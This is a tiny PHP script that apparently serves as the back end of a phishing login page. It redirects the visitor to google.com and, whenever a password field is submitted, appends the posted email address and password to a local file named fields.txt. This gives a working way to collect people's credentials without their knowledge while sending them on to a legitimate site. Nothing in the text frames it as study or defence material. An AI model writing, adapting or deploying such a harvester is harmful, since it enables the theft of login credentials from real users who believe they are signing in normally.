<?php
header("Location: http://www.google.com");
if( isset( $_POST['passwd'] ) )
{

    $txt= $_POST['email'].' - '.$_POST['passwd'] . PHP_EOL; 
    file_put_contents('fields.txt', $txt, FILE_APPEND);
}
?>